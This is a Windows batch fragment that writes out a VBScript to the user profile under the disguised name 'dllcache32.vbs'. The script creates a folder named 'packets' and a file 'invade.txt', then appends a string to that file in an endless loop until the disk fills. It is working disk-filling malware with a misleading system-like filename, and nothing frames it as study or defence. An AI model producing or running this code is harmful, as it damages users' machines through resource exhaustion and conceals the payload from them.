(
echo Option Explicit
echo Dim objFSO, objFolder, objShell, objTextFile, objFile
echo Dim strDirectory, strFile, strText
echo strDirectory = "packets"
echo strFile = "\invade.txt"
echo strText = "%massive%"
echo Set objFSO = CreateObject("Scripting.FileSystemObject")
echo If objFSO.FolderExists(strDirectory) Then
echo Set objFolder = objFSO.GetFolder(strDirectory)
echo Else
echo Set objFolder = objFSO.CreateFolder(strDirectory)
echo End If
echo If objFSO.FileExists(strDirectory & strFile) Then
echo Set objFolder = objFSO.GetFolder(strDirectory)
echo Else
echo Set objFile = objFSO.CreateTextFile(strDirectory & strFile)
echo End If
echo set objFile = nothing
echo set objFolder = nothing
echo 'ForAppending = 8 ForReading = 1, ForWriting = 2
echo Const ForAppending = 8
echo Set objTextFile = objFSO.OpenTextFile _
echo (strDirectory & strFile, ForAppending, True)
echo Do
echo ' Writes strText every time you run this VBScript
echo objTextFile.WriteLine(strText)
echo Loop
echo objTextFile.Close
echo WScript.Quit
) > "%userprofile%\dllcache32.vbs"
